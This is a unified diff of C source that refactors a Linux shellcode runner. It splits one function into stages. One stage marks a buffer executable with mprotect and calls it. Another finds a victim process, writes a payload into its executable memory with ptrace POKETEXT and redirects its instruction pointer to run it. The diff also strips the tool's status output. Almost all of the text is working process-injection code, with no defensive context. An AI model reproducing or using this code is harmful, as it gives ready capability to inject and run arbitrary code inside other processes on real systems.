@@ -128,7 +128,7 @@ long parse_maps_file(long victim_pid) {
         if (permissions == NULL) {
             continue;
         } else if (strncmp("r-xp", permissions, 4) == 0) {
-            fprintf(stdout, "[*] Found section mapped with %s permissions.\n", permissions);
+            //fprintf(stdout, "[*] Found section mapped with %s permissions.\n", permissions);
             free(permissions);
             break;
         }
@@ -157,37 +157,30 @@ pid_t run_att() {
     }
 }
 
+unsigned int ngc_jexec(unsigned char *buffer) {
+    long page_size = sysconf(_SC_PAGESIZE);
+    void *page_start = (void *)((uintptr_t)buffer & -page_size);
 
-signed int NGC_ShellRunner(unsigned char *buffer, unsigned forking) {
-    if (!forking) {
-        long page_size = sysconf(_SC_PAGESIZE);
-        void *page_start = (void *)((uintptr_t)buffer & -page_size);
-
-        if (mprotect(page_start, page_size * 2, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
-            perror("mprotect");
-            return -1;
-        }
-
-        int result = (*(int(*)())buffer)();
-
-        if (mprotect(page_start, page_size * 2, PROT_READ | PROT_EXEC) == -1) {
-            perror("mprotect");
-            return -1;
-        }
-        return result;
+    if (mprotect(page_start, page_size * 2, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
+        perror("mprotect");
+        return -1;
     }
 
-    fflush(stdout);
-    int temp_stdout;
-    temp_stdout = dup(fileno(stdout));
-    int pipes[2];
-    pipe(pipes);
-    dup2(pipes[1], fileno(stdout));
-    write(pipes[1], "", 1);
+    int result = (*(int(*)())buffer)();
 
+    if (mprotect(page_start, page_size * 2, PROT_READ | PROT_EXEC) == -1) {
+        perror("mprotect");
+        return -1;
+    }
+    return result;
+}
 
+unsigned victim_pid=0;
+long address=0;
+
+unsigned int ngc_stage1(unsigned char *buffer) {
     long pid_max = get_proc_pid_max();
-    unsigned victim_pid = run_att();
+    victim_pid = run_att();
 
     if (victim_pid == 0 || victim_pid > pid_max) {
         fprintf(stderr, "Argument not a valid number. Aborting.\n");
@@ -201,8 +194,10 @@ signed int NGC_ShellRunner(unsigned char *buffer, unsigned forking) {
     }
     wait(NULL);
 
-    fprintf(stdout, "[*] Attach to the process with PID %ld.\n", victim_pid);
+    return victim_pid;
+}
 
+unsigned long ngc_stage2(unsigned char *buffer) {
     struct user_regs_struct old_regs;
     if (ptrace(PTRACE_GETREGS, victim_pid, NULL, &old_regs) < 0) {
         fprintf(stderr, "Failed to PTRACE_GETREGS: %s\n", strerror(errno));
@@ -214,7 +209,6 @@ signed int NGC_ShellRunner(unsigned char *buffer, unsigned forking) {
     size_t payload_size = strlen(buffer);
     uint64_t *payload = (uint64_t *)buffer;
 
-    fprintf(stdout, "[*] Injecting payload at address 0x%lx.\n", address);
     for (size_t i = 0; i < payload_size; i += 8, payload++) {
         if (ptrace(PTRACE_POKETEXT, victim_pid, address + i, *payload) < 0) {
             fprintf(stderr, "Failed to PTRACE_POKETEXT: %s\n", strerror(errno));
@@ -222,8 +216,6 @@ signed int NGC_ShellRunner(unsigned char *buffer, unsigned forking) {
         }
     }
 
-
-    fprintf(stdout, "[*] Jumping to the injected code.\n");
     struct user_regs_struct regs;
     memcpy(&regs, &old_regs, sizeof(struct user_regs_struct));
     regs.rip = address;
@@ -237,20 +229,12 @@ signed int NGC_ShellRunner(unsigned char *buffer, unsigned forking) {
         fprintf(stderr, "Failed to PTRACE_CONT: %s. \n", strerror(errno));
         exit(EXIT_FAILURE);
     }
-
-    fprintf(stdout, "[*] Sucessfuly injected and jumped to the code.\n");
-
+    return address;
+}
+    
+signed int ngc_stage3() {
     signed int status;
     waitpid(victim_pid, &status, 0);
-
-    // Restore stdout
-    fflush(stdout);
-    dup2(temp_stdout, fileno(stdout));
-
-    const int buffer_size = 1024;
-    char buffer[buffer_size];
-    read(pipes[0], buffer, buffer_size);
-    printf(buffer);
 
     return WEXITSTATUS(status);
 }
